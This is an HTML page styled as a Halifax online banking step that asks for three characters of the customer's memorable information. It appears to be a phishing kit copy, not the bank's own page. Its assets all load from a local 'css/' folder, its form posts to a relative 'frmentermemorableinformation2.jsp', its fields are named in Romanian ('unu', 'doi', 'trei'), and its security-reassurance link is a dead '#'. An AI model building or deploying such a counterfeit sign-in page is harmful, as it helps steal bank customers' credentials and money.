<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb">
	<head>
		

<title>Halifax - Enter Memorable Information</title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	
<meta http-equiv="content-language" content="en-gb" />
<!--[if gte IE 8]><meta http-equiv="X-UA-Compatible" content="IE=IE8" /><![endif]-->
<meta name="robots" content="noindex" />
<meta name="distribution" content="global" />
<meta name="rating" content="general" />


<link rel="shortcut icon" href="css/favicon.ico" />

<link href="css/global1-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />
<link href="css/global2-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />

<link href="css/print_base-min110729.css" media="print" type="text/css" rel="stylesheet" />
<!--[if IE 8]>
<link href="css/ie8-min110817.css" type="text/css" rel="stylesheet" />
<![endif]-->
<!--[if IE 7]>
<link href="css/ie7-min111005.css" type="text/css" rel="stylesheet" />
<![endif]-->
<!--[if lt IE 7]>
<link href="css/ie6-min111004.css" type="text/css" rel="stylesheet" />
<![endif]-->

<script type="text/javascript" src="css/jquery-min110923.js"></script>
<script type="text/javascript" src="css/scriptsnippet.jspf"></script>
<script type="text/javascript" src="css/global-min111005.js"></script>

<script type="text/javascript" src="css/custom-min111005.js"></script>

	</head>
	<body>

		<div id="wrapper">
			
<div class="outer">
	<div id="header">
		<ul id="skiplinks">	
			<li><a id="lnkSkip" name="lnkSkip" href="#page">Skip to main content</a></li>

		</ul>
		<div class="clearfix">
			<p id="logo">
				<span><img src="css/personal_loans_halifax-1-1290683246.jpg" alt="Halifax" /></span>	
			</p>
			<div class="secureMsg"><p class="msg"><img src="css/hfx-sign-in-to-secure-site-1-1314611574.png" alt="You&amp;#8217;re signing in to a secure site" /></p><p><a href="#" title="How can I tell that this site is secure?"  class="newwin">How can I tell that this site is secure?</a></p></div>
			
			
			
				
		</div>
	</div>
</div>

			<div class="pageWrap">
				<div id="page" class="content">
				
					<div class="primaryWrap">
					
						<div class="primary">
						<div class="panel">
						<h1>My memorable information</h1><div class="inner"><p><strong>Please enter characters 2, 3 and 5 from your memorable information.</strong></p><p>This sign in step improves your security.</p></div>
<form id="frmentermemorableinformation1" name="frmentermemorableinformation1" method="post" action="frmentermemorableinformation2.jsp" class="validationName:(frmentermemorableinformation1) validate:()" autocomplete="off" ">
<fieldset class="memInfoSelect clearfix"><div class="formField validate:(oneSelectFieldRequired) validationName:(memorableInformation) clearfix"><div class="formFieldInner"><div class="clearfix"><label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">Character 2 &#160;</label><select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1" name="unu"><option value="-">Select</option><option value="&amp;nbsp;a">a</option><option value="&amp;nbsp;b">b</option><option value="&amp;nbsp;c">c</option><option value="&amp;nbsp;d">d</option><option value="&amp;nbsp;e">e</option><option value="&amp;nbsp;f">f</option><option value="&amp;nbsp;g">g</option><option value="&amp;nbsp;h">h</option><option value="&amp;nbsp;i">i</option><option value="&amp;nbsp;j">j</option><option value="&amp;nbsp;k">k</option><option value="&amp;nbsp;l">l</option><option value="&amp;nbsp;m">m</option><option value="&amp;nbsp;n">n</option><option value="&amp;nbsp;o">o</option><option value="&amp;nbsp;p">p</option><option value="&amp;nbsp;q">q</option><option value="&amp;nbsp;r">r</option><option value="&amp;nbsp;s">s</option><option value="&amp;nbsp;t">t</option><option value="&amp;nbsp;u">u</option><option value="&amp;nbsp;v">v</option><option value="&amp;nbsp;w">w</option><option value="&amp;nbsp;x">x</option><option value="&amp;nbsp;y">y</option><option value="&amp;nbsp;z">z</option><option value="&amp;nbsp;0">0</option><option value="&amp;nbsp;1">1</option><option value="&amp;nbsp;2">2</option><option value="&amp;nbsp;3">3</option><option value="&amp;nbsp;4">4</option><option value="&amp;nbsp;5">5</option><option value="&amp;nbsp;6">6</option><option value="&amp;nbsp;7">7</option><option value="&amp;nbsp;8">8</option><option value="&amp;nbsp;9">9</option></select></div><div class="clearfix"><label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">Character 3 &#160;</label><select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2" name="doi"><option value="-">Select</option><option value="&amp;nbsp;a">a</option><option value="&amp;nbsp;b">b</option><option value="&amp;nbsp;c">c</option><option value="&amp;nbsp;d">d</option><option value="&amp;nbsp;e">e</option><option value="&amp;nbsp;f">f</option><option value="&amp;nbsp;g">g</option><option value="&amp;nbsp;h">h</option><option value="&amp;nbsp;i">i</option><option value="&amp;nbsp;j">j</option><option value="&amp;nbsp;k">k</option><option value="&amp;nbsp;l">l</option><option value="&amp;nbsp;m">m</option><option value="&amp;nbsp;n">n</option><option value="&amp;nbsp;o">o</option><option value="&amp;nbsp;p">p</option><option value="&amp;nbsp;q">q</option><option value="&amp;nbsp;r">r</option><option value="&amp;nbsp;s">s</option><option value="&amp;nbsp;t">t</option><option value="&amp;nbsp;u">u</option><option value="&amp;nbsp;v">v</option><option value="&amp;nbsp;w">w</option><option value="&amp;nbsp;x">x</option><option value="&amp;nbsp;y">y</option><option value="&amp;nbsp;z">z</option><option value="&amp;nbsp;0">0</option><option value="&amp;nbsp;1">1</option><option value="&amp;nbsp;2">2</option><option value="&amp;nbsp;3">3</option><option value="&amp;nbsp;4">4</option><option value="&amp;nbsp;5">5</option><option value="&amp;nbsp;6">6</option><option value="&amp;nbsp;7">7</option><option value="&amp;nbsp;8">8</option><option value="&amp;nbsp;9">9</option></select></div><div class="clearfix"><label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">Character 5 &#160;</label><select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3" name="trei"><option value="-">Select</option><option value="&amp;nbsp;a">a</option><option value="&amp;nbsp;b">b</option><option value="&amp;nbsp;c">c</option><option value="&amp;nbsp;d">d</option><option value="&amp;nbsp;e">e</option><option value="&amp;nbsp;f">f</option><option value="&amp;nbsp;g">g</option><option value="&amp;nbsp;h">h</option><option value="&amp;nbsp;i">i</option><option value="&amp;nbsp;j">j</option><option value="&amp;nbsp;k">k</option><option value="&amp;nbsp;l">l</option><option value="&amp;nbsp;m">m</option><option value="&amp;nbsp;n">n</option><option value="&amp;nbsp;o">o</option><option value="&amp;nbsp;p">p</option><option value="&amp;nbsp;q">q</option><option value="&amp;nbsp;r">r</option><option value="&amp;nbsp;s">s</option><option value="&amp;nbsp;t">t</option><option value="&amp;nbsp;u">u</option><option value="&amp;nbsp;v">v</option><option value="&amp;nbsp;w">w</option><option value="&amp;nbsp;x">x</option><option value="&amp;nbsp;y">y</option><option value="&amp;nbsp;z">z</option><option value="&amp;nbsp;0">0</option><option value="&amp;nbsp;1">1</option><option value="&amp;nbsp;2">2</option><option value="&amp;nbsp;3">3</option><option value="&amp;nbsp;4">4</option><option value="&amp;nbsp;5">5</option><option value="&amp;nbsp;6">6</option><option value="&amp;nbsp;7">7</option><option value="&amp;nbsp;8">8</option><option value="&amp;nbsp;9">9</option></select></div></div></div></fieldset><div class="inner"><ul class="linkList"><li><a id="frmentermemorableinformation1:lktrouble" name="frmentermemorableinformation1:lktrouble" href="/personal/logon/entermemorableinformation.jsp?lnkcmd=frmentermemorableinformation1%3Alktrouble&amp;al=" title="Having problems logging in?">Having problems logging in?</a></li></ul></div><ul class="actions"><li class="primaryAction"><input id="frmentermemorableinformation1:btnContinue" name="frmentermemorableinformation1:btnContinue" type="image" src="css/continue-4-1294218380.png" alt="Continue" title="Continue" class="submitAction" /></li><li><strong><a id="frmentermemorableinformation1:lkCancel" name="frmentermemorableinformation1:lkCancel" href="login.jsp" title="Cancel" class="cancel pseudoLink">Cancel</a></strong></li></ul><input type="hidden" name="frmentermemorableinformation1" value="frmentermemorableinformation1" /><input type="hidden" name="submitToken" value="5704463" />

</form>
							</div>
						</div>
						
					</div>
					<div class="secondary">
						<div class="panel">
							<div class="accordion"><div class="part"><h2 class="trigger">Contact us</h2><div class="pane"><div class="paneInner"><div class="quickContact"><h3>Bank accounts</h3>
<p>08457 203 040<br />+44 1132 422 229&#160;from outside the UK</p>

<h3>Savings</h3>
<p>08457 263 646<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday 8am-6pm, Sunday 9am-5pm.</p>
<h3>Credit cards</h3>
<p>08457 283 848<br />+44 8457 283 848&#160;from outside the UK</p>
<p>08459 444 555&#160;if your card number begins 525303<br />+44 1733 573 189&#160;from outside the UK</p>

<h3>Mortgages</h3>
<p>08457 27 37 47<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday and Sunday 9am-4pm.</p>
<h3>Personal loans</h3>
<p>If your loan agreement begins with 7 call&#160;08457 243 444&#160;(Lines are open Monday to Friday 8am-8pm, Saturday 9am-6pm).<br />
If your loan agreement begins with 84 call&#160;08457 444 455&#160;(Lines are open Monday to Friday 8am-10pm, Saturday 8:30am-6pm, Sunday 9:30am-5.30pm).<br />

If your loan agreement begins with 100 call&#160;08456 047 292&#160;(Lines are open Monday to Sunday 8am-10pm).</p>
<h3>Lost or stolen cards</h3>
<p>08457 203 099<br />+44 1315 498 050&#160;from outside the UK</p>
<h3>Online Banking Helpdesk</h3>
<p>08456 020 000<br />+44 1132 798 302&#160;from outside the UK</p>
<h3>Textphone</h3>

<p>08457 323 436<br />
Lines are open Monday to Friday, 9am - 5.30pm. (For use by customers with hearing impairments only)</p>
<p>We may record your call so we can check we've carried out your instructions correctly and to help us improve our service.</p></div></div></div></div><div class="part"><h2 class="trigger current">Help &amp; support</h2><div class="pane"><div class="paneInner"><ul class="quickFAQs">
			
	
	<li><h3 class="qfaqTrigger">How do I sign in with my memorable information?</h3>
			<div class="qfaqCont">
					<p><p>When you sign in to Online Banking the second time, you'll enter your&#160;username and password. You'll then be asked to enter 3 randomly chosen characters from your memorable information. This will happen every time you&#160;sign-in&#160;to Online Banking.</p>

</p>
				    </div>
			</li>
<li><h3 class="qfaqTrigger">Is my memorable information the same as my password?</h3>
			<div class="qfaqCont">
					<p><p>No. Your memorable information should be different from your password. That way, your account stays as secure as it can be. If you forget your memorable information, click '<a href="/submitreplaceunlockauthmechanism/customeridentificationdata.jsp" >Having problems logging in?</a>' and follow the instructions.</p>
</p>
				    </div>

			</li>
<li><h3 class="qfaqTrigger">What can I do if I forget my memorable information?</h3>
			<div class="qfaqCont">
					<p><p>Click 'Forgotten your memorable information?' and follow the instructions. You'll be able to reset your sign-in details so you can get back online quickly.</p>
</p>
				    </div>
			</li>
<li><h3 class="qfaqTrigger">What else can I do to protect myself online?</h3>
			<div class="qfaqCont">

					<p><p>Keeping a few good habits can help make sure your personal information stays safe and secure online.&#160;<a href="http://www.halifax.co.uk/SecurityandPrivacy/security-centre-home/what-you-can-do/default.asp?pagetabs=2>" class="newwin" >security_centre_home</a>&#160;</p>
</p>
				    </div>
			</li>
</ul>

					<p><a href="http://www.halifax.co.uk/onlinebankinghelp/onlinehelp.asp" title="More help &amp; support" target="_blank"  class="linkBullet linkMore newwin newfaqwin">More help & support</a></p></div></div></div></div>
						</div>

					</div>
				</div>				
			</div>
			
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul><li><a href="http://www.halifax.co.uk/bankaccounts/help-guidance/important-information/" title="Legal"  class="newwin">Legal</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Privacy</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Security</a></li><li><a href="http://www.lloydsbankinggroup.com/"  class="newwin">Lloyds Banking Group</a></li><li><a href="http://www.halifax.co.uk/bankaccounts/rates-rewards-fees/" title="Rates &amp; fees"  class="newwin">Rates & fees</a></li></ul>
</div>

</div>
</div>

		</div>
		



	</body>
</html>
<!-- 118 served by 010304 -->